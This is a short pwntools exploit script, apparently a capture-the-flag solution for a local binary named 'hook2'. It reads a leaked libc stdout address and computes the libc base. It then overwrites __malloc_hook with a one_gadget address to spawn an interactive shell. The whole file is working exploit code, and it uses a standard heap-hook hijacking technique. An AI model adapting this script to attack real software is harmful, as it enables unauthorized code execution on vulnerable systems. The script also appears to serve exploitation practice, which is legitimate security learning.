from pwn import *

context.log_level = 'debug'

p = process('./bin/hook2')
pause() 

e = p.elf
libc = e.libc

stdout = int(p.recvline().strip().split(b': ')[1], 16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget =  libc_base + 0x4f432

log.info('stdout: ' + hex(stdout))
log.info('libc_base: ' + hex(libc_base))
log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('one_gadget: ' + hex(one_gadget))

p.send(p64(malloc_hook) + p64(one_gadget))

p.interactive()
